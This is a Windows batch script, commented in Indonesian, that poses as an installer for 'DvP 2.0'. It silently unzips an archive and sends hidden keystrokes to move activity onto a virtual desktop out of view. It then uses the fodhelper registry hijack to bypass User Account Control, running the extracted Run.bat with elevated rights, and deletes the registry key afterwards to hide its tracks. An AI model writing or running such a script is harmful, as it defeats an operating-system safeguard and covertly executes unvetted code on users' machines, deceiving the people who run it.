@echo off
REM =============================
REM Installer DvP 2.0 + Desktop Virtual
REM =============================

SET "SourceFolder=%~dp0"
SET "ZipName=DvP-2.0.zip"
SET "DestFolder=%SourceFolder%DvP 2.0 Extracted"
SET "SevenZipPath=C:\Program Files\7-Zip\7z.exe"
SET "BatchToRun=Run.bat"

REM Membuat folder tujuan jika belum ada
IF NOT EXIST "%DestFolder%" (
    mkdir "%DestFolder%"
)

REM Mengecek 7-Zip
IF NOT EXIST "%SevenZipPath%" (
    echo 7-Zip tidak ditemukan. Silakan install 7-Zip.
    pause
    exit /b
)

REM Ekstraksi silent
"%SevenZipPath%" x "%SourceFolder%%ZipName%" -o"%DestFolder%" -y >nul

REM === JALANKAN DESKTOP VIRTUAL OTOMATIS ===
echo [*] Membuat Desktop Virtual baru dan pindah ke desktop sebelumnya...
powershell -noprofile -windowstyle hidden -command ^
"$wshell = New-Object -ComObject wscript.shell; Start-Sleep -Milliseconds 500; $wshell.SendKeys('^{%}d'); Start-Sleep -Milliseconds 300; $wshell.SendKeys('^%{LEFT}')"

REM =============================
REM Jalankan Run.bat via UAC Bypass (fodhelper)
REM =============================

SET "currentDir=%DestFolder%\"

REM Menambahkan registry untuk UAC bypass
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%%BatchToRun%\""
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""

REM Menjalankan fodhelper.exe untuk bypass UAC
start "" "C:\Windows\System32\fodhelper.exe"

REM Tunggu 5 detik agar Run.bat / oprek.bat berjalan
timeout /t 5 >nul

REM Hapus registry yang dibuat
REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

echo [✓] Proses selesai.
exit
